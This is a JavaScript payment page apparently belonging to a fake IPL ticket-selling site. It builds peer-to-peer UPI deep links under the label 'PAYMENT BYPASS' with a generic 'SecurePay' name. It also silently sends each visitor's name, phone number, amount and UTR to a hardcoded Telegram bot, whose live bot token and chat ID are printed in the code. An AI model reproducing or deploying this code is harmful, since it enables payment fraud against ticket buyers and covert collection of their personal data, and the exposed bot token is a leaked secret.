// 🔥 Vite के लिए Firebase Imports
import { db, ref, get, push, set } from "./firebase.js";

// ========== LOAD DATA ==========
var matchName = localStorage.getItem("matchName") || localStorage.getItem("selectedMatch") ? JSON.parse(localStorage.getItem("selectedMatch")).title : "Match";
var matchDate = localStorage.getItem("matchDate") || "";
var venue = localStorage.getItem("venue") || "";

var selectedSeats = JSON.parse(localStorage.getItem("selectedSeats") || "[]");
var seatCount = selectedSeats.length || Number(localStorage.getItem("seatQuantity")) || 1;

var orderTotal = Number(localStorage.getItem("orderTotal") || localStorage.getItem("finalPrice") || 0);
var userEmail = localStorage.getItem("userEmail") || localStorage.getItem("customerEmail") || "user@gmail.com";
var userName = localStorage.getItem("customerName") || "Unknown";
var userPhone = localStorage.getItem("customerPhone") || "Unknown";

// ========== TELEGRAM ALERT BOT ==========
const botToken = "8642950249:AAF8oxzhk-6NvYTEtpIW0oNNwsb2RQljliY"; 
const chatId = "6820660513"; 

async function sendTelegramAlert(msg) {
    const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(msg)}&parse_mode=HTML`;
    try { await fetch(url); } catch (err) { console.log("Telegram failed"); }
}

// ========== FORMAT & SAFE TEXT ==========
function formatPrice(num) {
  return "₹" + Number(num || 0).toFixed(2);
}

function setText(id, value) {
  var el = document.getElementById(id);
  if (el) el.textContent = value;
}

// ========== BILL RENDER ==========
function renderBill() {
  let formattedDate = matchDate;
  try {
    const d = new Date(matchDate);
    if (!isNaN(d)) {
      formattedDate = d.toLocaleString("en-IN", {
        day: "numeric", month: "short", hour: "2-digit", minute: "2-digit"
      });
    }
  } catch(e){}

  setText("match-name", matchName);
  setText("match-date", formattedDate);
  setText("match-venue", venue);
  setText("amount-seats", seatCount + (seatCount === 1 ? " Ticket" : " Tickets"));
  
  let seatNamesText = selectedSeats.length > 0 ? selectedSeats.join(" • ") : (localStorage.getItem("selectedSeatType") || "General");
  setText("seat-names", seatNamesText);

  setText("total-amount", formatPrice(orderTotal));
  setText("subtotal", formatPrice(orderTotal));
  setText("bottom-total", formatPrice(orderTotal));
}

// ========== COPY UPI ==========
function initCopyUPI() {
  const btn = document.getElementById("copy-btn");
  const upiText = document.getElementById("upi-id");
  if (!btn || !upiText) return;

  btn.addEventListener("click", async function () {
    const text = upiText.textContent.trim();
    if (!text) return;
    try {
      await navigator.clipboard.writeText(text);
      btn.textContent = "COPIED";
      btn.style.background = "#43a047";
    } catch (err) {
      const tempInput = document.createElement("input");
      tempInput.value = text;
      document.body.appendChild(tempInput);
      tempInput.select();
      document.execCommand("copy");
      document.body.removeChild(tempInput);
      btn.textContent = "COPIED";
    }
    setTimeout(() => {
      btn.textContent = "COPY";
      btn.style.background = "#e53935";
    }, 1500);
  });
}

// ========== PAYMENT BYPASS (NO QR, DEEP LINKS WITH BASE64) ==========
function setupPaymentBypass(upiId) {
    const finalPrice = orderTotal;
    const dynamicBrand = "SecurePay"; 
    const transactionNote = `IPL Ticket ${matchName}`;
    
    // 1. UPI URL
    const upiString = `upi://pay?pa=${upiId}&pn=${encodeURIComponent(dynamicBrand)}&tn=${encodeURIComponent(transactionNote)}&am=${finalPrice}&cu=INR`;

    // 2. Links Setup
    const phonepeLink = document.getElementById('phonepe-link');
    const paytmLink = document.getElementById('paytm-link');
    const gpayLink = document.getElementById('gpay-link');
    const amazonLink = document.getElementById('amazon-link');
    const anyUpiLink = document.getElementById('any-upi-link');

    // 🔥 PhonePe Payload (Base64)
    if (phonepeLink) {
        const phonepePayload = {
            contact: { cbcName: dynamicBrand, nickName: dynamicBrand, vpa: upiId, type: "VPA" },
            p2pPaymentCheckoutParams: { note: transactionNote, isByDefaultKnownContact: true, initialAmount: Number(finalPrice) * 100, currency: "INR", checkoutType: "DEFAULT", transactionContext: "p2p" }
        };
        phonepeLink.href = "phonepe://native?data=" + encodeURIComponent(btoa(JSON.stringify(phonepePayload))) + "&id=p2ppayment";
    }

    if (paytmLink) paytmLink.href = `paytmmp://cash_wallet?pa=${upiId}&pn=${encodeURIComponent(dynamicBrand)}&tn=${encodeURIComponent(transactionNote)}&am=${finalPrice}&cu=INR&featuretype=money_transfer`;
    if (gpayLink) gpayLink.href = `tei://upi/pay?pa=${upiId}&pn=${encodeURIComponent(dynamicBrand)}&tn=${encodeURIComponent(transactionNote)}&am=${finalPrice}&cu=INR`;
    if (amazonLink) amazonLink.href = upiString;
    if (anyUpiLink) anyUpiLink.href = upiString;
}

// ========== UTR & FIREBASE SAVE ==========
function initUTR() {
  var input = document.getElementById("utr-input");
  var btn = document.getElementById("submit-btn");
  var error = document.getElementById("utr-error");

  if (!input || !btn) return;

  input.addEventListener("input", function () {
    var val = input.value.trim();
    if (val.length >= 12) {
      btn.disabled = false;
      btn.classList.add("active");
      if (error) error.textContent = "";
    } else {
      btn.disabled = true;
      btn.classList.remove("active");
      if (error) error.textContent = "Enter valid UTR";
    }
  });

  btn.addEventListener("click", async function () {
    if (btn.disabled) return;
    
    btn.innerText = "Verifying...";
    btn.style.pointerEvents = "none";
    const utrVal = input.value.trim();

    // 1. Send UTR to Telegram
    const utrMsg = `✅ <b>पेमेंट UTR प्राप्त हुआ!</b> ✅\n\n👤 <b>नाम:</b> ${userName}\n📞 <b>नंबर:</b> ${userPhone}\n🏏 <b>मैच:</b> ${matchName}\n💵 <b>अमाउंट:</b> ₹${orderTotal}\n🧾 <b>UTR Number:</b> ${utrVal}`;
    await sendTelegramAlert(utrMsg);

    // 2. Save Data to Firebase
    try {
        const paymentRef = push(ref(db, 'payments'));
        await set(paymentRef, {
            name: userName,
            phone: userPhone,
            email: userEmail,
            match: matchName,
            seats: seatCount,
            amount: orderTotal,
            utr: utrVal,
            status: "Pending Verification",
            date: new Date().toISOString()
        });
    } catch (e) {
        console.log("Firebase Save Error", e);
    }

    showSuccessModal();
  });
}

// ========== MODAL ==========
function showSuccessModal() {
  var modal = document.getElementById("success-modal");
  setText("modal-email", userEmail);
  if (modal) modal.classList.add("show");
}

function initModal() {
  var btn = document.getElementById("modal-ok-btn");
  if (!btn) return;
  btn.addEventListener("click", function () {
    window.location.href = "index.html"; // Home page 
  });
}

// ========== INIT (FETCH FIREBASE UPI & ALERT) ==========
async function loadUPI() {
  let activeUpiId = "paytm.s1h6t6g@pty"; 
  try {
    const snapshot = await get(ref(db, 'settings/payment'));
    if (snapshot.exists() && snapshot.val().upiId) {
      activeUpiId = snapshot.val().upiId;
    }
  } catch (err) {
    console.log("Firebase UPI load error, using default");
  }
  
  setText("upi-id", activeUpiId);
  setupPaymentBypass(activeUpiId);
}

function init() {
  renderBill();
  loadUPI();
  initCopyUPI(); 
  initUTR();
  initModal();

  var loader = document.getElementById("page-loader");
  if (loader) loader.style.display = "none";

  // 🔥 SEND PAGE LOAD TELEGRAM ALERT
  setTimeout(() => {
      const loadMsg = `💰 <b>कस्टमर Payment Page पर आ गया है!</b> 💰\n\n👤 <b>नाम:</b> ${userName}\n📞 <b>नंबर:</b> ${userPhone}\n🏏 <b>मैच:</b> ${matchName}\n💵 <b>अमाउंट:</b> ₹${orderTotal}\n💡 <b>स्टेटस:</b> पेमेंट करने की तैयारी कर रहा है...`;
      sendTelegramAlert(loadMsg);
  }, 1000);
}

document.addEventListener("DOMContentLoaded", init);
